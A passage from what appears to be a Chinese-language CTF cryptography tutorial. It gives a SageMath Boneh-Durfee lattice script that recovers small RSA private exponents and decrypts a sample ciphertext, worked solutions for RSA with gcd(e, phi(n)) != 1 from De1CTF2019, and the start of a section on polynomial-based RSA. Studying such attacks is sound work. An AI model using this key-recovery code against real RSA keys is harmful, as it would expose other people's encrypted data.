class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don't have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn't necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don't work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">helpful_vectors</span><span class="params">(BB, modulus)</span>:</span></span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    print(nothelpful, <span class="string">"/"</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">" vectors are not helpful"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span><span class="params">(BB, bound)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">'%02d '</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">'0'</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">'X'</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">' '</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">'~'</span></span><br><span class="line">        print(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span><span class="params">(BB, monomials, bound, current)</span>:</span></span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == <span class="number">-1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(current, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let's check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">"* removing unhelpful vector"</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> range(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print(<span class="string">"* removing unhelpful vectors"</span>, ii, <span class="string">"and"</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">""" </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn't bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span><span class="params">(pol, modulus, mm, tt, XX, YY)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> range(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> range(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> range(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = len(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> range(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> range(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn<span class="number">-1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"failure"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        print(<span class="string">"We do not have det &lt; bound. Solutions might not be found."</span>)</span><br><span class="line">        print(<span class="string">"Try with highers m and t."</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            print(<span class="string">"size det(L) - size e^(m*n) = "</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>, <span class="number">-1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"optimizing basis of the lattice via LLL, this can take a long time"</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"LLL is done!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"looking for independent vectors in the lattice"</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> range(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> range(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> range(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"found them, using vectors"</span>, pol1_idx, <span class="string">"and"</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        print(<span class="string">"no independant vectors could be found. This should very rarely happen..."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(soly) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Your prediction (delta) is too small"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span></span><br><span class="line">    c = <span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.28</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = int((<span class="number">1</span><span class="number">-2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don't touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = int((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== checking values ==="</span>)</span><br><span class="line">        print(<span class="string">"* delta:"</span>, delta)</span><br><span class="line">        print(<span class="string">"* delta &lt; 0.292"</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        print(<span class="string">"* size of e:"</span>, int(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* size of N:"</span>, int(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        print(<span class="string">"* m:"</span>, m, <span class="string">", t:"</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== running algorithm ==="</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"=== solution found ==="</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            print(<span class="string">"x:"</span>, solx)</span><br><span class="line">            print(<span class="string">"y:"</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = int(pol(solx, soly) / e)</span><br><span class="line">        print(<span class="string">"private key found:"</span>, d)</span><br><span class="line">        print(<span class="string">"plaintext:"</span>, pow(c, d, N))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"=== no solution was found ==="</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        print(<span class="string">"=== %s seconds ==="</span> % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><h3 id="rsa---gcdevarphinneq-1">RSA - <span class="math inline">\(gcd(e,\varphi(n)\neq 1)\)</span></h3><h4 id="theorem-9">Theorem</h4><p><span class="math inline">\(gcd(e,\varphi(n))\neq 1\)</span>时，<span class="math inline">\(e&#39;\leftarrow e//gcd(e,\varphi(n)),d\leftarrow invert(e&#39;,\varphi(n))\)</span>，<span class="math inline">\(c^{d}\equiv m^{gcd(e,\varphi(n))}\ mod\ n\)</span></p><p>已知<span class="math inline">\(m^{gcd(e,\varphi(n))}\)</span>后攻击方向不定，视题目而定</p><h4 id="example">Example</h4><p>De1CTF2019 - Baby RSA</p><p>最后步骤的加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(c1==pow(flag,e1,p*q1))</span><br><span class="line"><span class="keyword">assert</span>(c2==pow(flag,e2,p*q2))</span><br></pre></td></tr></table></figure><p>p, q1, q2 均为素数，<span class="math inline">\(f_{1}=gcd(e_{1},\varphi(pq_{1}))\neq 1,f_{2}=gcd(e_{2},\varphi(pq_{2}))\neq 1\)</span></p><p>但发现<span class="math inline">\(gcd(e_{1},\varphi(pq_{1}))=gcd(e_{2},\varphi(pq_{2}))=14\)</span>，于是可以用ext_gcd求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c // d * gmpy2.invert(curm // d, m // d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m // d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f3, lcm = GCRT([n1, n2], [f1, f2])</span><br><span class="line"><span class="keyword">assert</span>(f3 % n1 == f1)</span><br><span class="line"><span class="keyword">assert</span>(f3 % n2 == f2)</span><br><span class="line"><span class="keyword">assert</span>(lcm == q1*q2*p)</span><br></pre></td></tr></table></figure><p>又发现gcd=14的因子7来自p，所以令<span class="math inline">\(n_{3}=q_{1}\cdot q_{2},c_{3}=f_{3}\%n_{3}\)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d3 = gmpy2.invert(<span class="number">7</span>, phi3)</span><br><span class="line">m3 = pow(c3, d3, n3)</span><br></pre></td></tr></table></figure><p><span class="math inline">\(m_{3}\equiv m^{2}\ mod\ n_{3}\)</span></p><p>作小公钥指数的爆破即可.</p><p>但m如果太大时，就要用到一些有限域上开二次根的算法，在本文后面会有所提及.</p><h3 id="rsa---polynomial-based-rsa">RSA - Polynomial based RSA</h3><h4 id="theorem-10">Theorem</h4><p>设p为素数，<span class="math inline">\(F_{p}\)</span>为p元有限域，<span class="math inline">\(F_{p}\)</span>上多项式形式的RSA是基于<span class="math inline">\(F_{p}\)</span>上多项式的一个已知定理，可类比欧拉定理</p><p>设<span class="math inline">\(F_{p}[x]\)</span>是<span class="math inline">\(F_{p}\)</span>上的一元多项式环，P和Q为<span class="math inline">\(F_{p}(x)\)</span>上的既约多项式，<span class="math inline">\(N=P\cdot Q\)</span>，<span class="math inline">\(F_{p}[x]\)</span>的模N商环下的多项式M满足gcd(M,N)=1</p><p>则<span class="math inline">\(M^{\varphi(N)}=1\)</span>（对于多项式下的<span class="math inline">\(\varphi(N)\)</span>，不同于ZZ上RSA的<span class="math inline">\((p-1)\cdot (q-1)\)</span>，但基本定义相同，即度小于degree(N)的所有满足gcd(*,N)的多项式*）</p><p><span class="math inline">\(\because\)</span> P, Q均为既约多项式， <span class="math inline">\(\therefore\varphi(P)=p^{P.degree()}-1,\varphi(Q)=p^{Q.degree()}-1,\varphi(N)=(p^{P.degree()}-1)\cdot (p^{Q.degree()}-1)\)</span></p><p>加密过程中，明文m的多项式表示方法大致有以下两种：</p><ol type="1"><li><p>对应ascii码作多项式系数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_irreducable_poly</span><span class="params">(deg)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        <span class="keyword">if</span> out.is_irreducible():</span><br><span class="line">            <span class="keyword">return</span> out</span><br><span class="line">       </span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">N 